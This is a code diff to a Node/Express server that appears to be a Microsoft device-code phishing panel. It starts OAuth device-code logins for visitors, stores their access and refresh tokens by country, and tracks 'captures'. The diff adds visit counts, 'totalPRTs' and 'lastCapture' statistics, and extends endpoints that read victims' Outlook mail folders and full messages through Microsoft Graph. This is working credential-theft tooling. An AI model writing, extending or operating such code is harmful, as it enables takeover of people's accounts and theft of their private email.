@@ -20,20 +20,21 @@ const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
 let userSessions = new Map();
 let pendingAuth = new Map();
 let sessionCounter = 1;
+let totalVisits = 0;
 
-// Country colors for stats
-const countryColors = {
-    'United States': '#B22234',
-    'Canada': '#FF0000',
-    'United Kingdom': '#00247D',
-    'Germany': '#FFCC00',
-    'France': '#0055A4',
-    'Japan': '#BC002D',
-    'Australia': '#012169',
-    'India': '#FF9933',
-    'Netherlands': '#FF7900',
-    'Sweden': '#005B99',
-    'Other': '#6B8E23'
+// Country colors and flags
+const countryData = {
+    'United States': { color: '#B22234', flag: '🇺🇸' },
+    'Canada': { color: '#FF0000', flag: '🇨🇦' },
+    'United Kingdom': { color: '#00247D', flag: '🇬🇧' },
+    'Germany': { color: '#FFCC00', flag: '🇩🇪' },
+    'France': { color: '#0055A4', flag: '🇫🇷' },
+    'Japan': { color: '#BC002D', flag: '🇯🇵' },
+    'Australia': { color: '#012169', flag: '🇦🇺' },
+    'India': { color: '#FF9933', flag: '🇮🇳' },
+    'Netherlands': { color: '#FF7900', flag: '🇳🇱' },
+    'Sweden': { color: '#005B99', flag: '🇸🇪' },
+    'Other': { color: '#6B8E23', flag: '🌍' }
 };
 
 function getCountryFromIp(ip) {
@@ -71,6 +72,8 @@ app.post('/start', async (req, res) => {
         const clientIp = getClientIp(req);
         const userAgent = req.headers['user-agent'] || 'Unknown';
         const country = getCountryFromIp(clientIp);
+        
+        totalVisits++;
         
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
@@ -290,6 +293,20 @@ app.get('/api/country_stats', (req, res) => {
     res.json({ countries: countryCount, total: userSessions.size });
 });
 
+app.get('/api/overview_stats', (req, res) => {
+    const totalSessions = userSessions.size;
+    const totalPRTs = Array.from(userSessions.values()).filter(s => s.refresh_token).length;
+    const countries = new Set(Array.from(userSessions.values()).map(s => s.country)).size;
+    
+    res.json({
+        totalVisits: totalVisits,
+        totalSessions: totalSessions,
+        totalPRTs: totalPRTs,
+        totalCountries: countries,
+        lastCapture: totalSessions > 0 ? new Date(Math.max(...Array.from(userSessions.values()).map(s => s.capturedAt))).toLocaleString() : 'None'
+    });
+});
+
 app.delete('/api/delete_access_token/:id', (req, res) => {
     const id = parseInt(req.params.id);
     if (userSessions.has(id)) {
@@ -314,11 +331,12 @@ app.delete('/api/sessions/clear', (req, res) => {
     userSessions.clear();
     pendingAuth.clear();
     sessionCounter = 1;
+    totalVisits = 0;
     res.json({ success: true });
 });
 
 // ============================================
-// MAILBOX API - Uses PRT to get fresh token
+// MAILBOX API - Full Outlook Integration
 // ============================================
 app.get('/api/mail/folders/:email', async (req, res) => {
     const { email } = req.params;
@@ -344,7 +362,7 @@ app.get('/api/mail/:email/:folderId', async (req, res) => {
     try {
         const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderId}/messages`, {
             headers: { 'Authorization': `Bearer ${token}` },
-            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' }
+            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,importance' }
         });
         res.json(response.data);
     } catch (err) {
@@ -360,7 +378,7 @@ app.get('/api/mail/message/:email/:messageId', async (req, res) => {
     try {
         const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
             headers: { 'Authorization': `Bearer ${token}` },
-            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
+            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments,conversationId' }
         });
         res.json(response.data);
     } catch (err) {
@@ -447,6 +465,6 @@ app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.ht
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
-    console.log(`✅ Resource: ${config.active_resource}`);
+    console.log(`✅ Graph API Ready - Mailbox enabled`);
     console.log(`========================================\n`);
 });
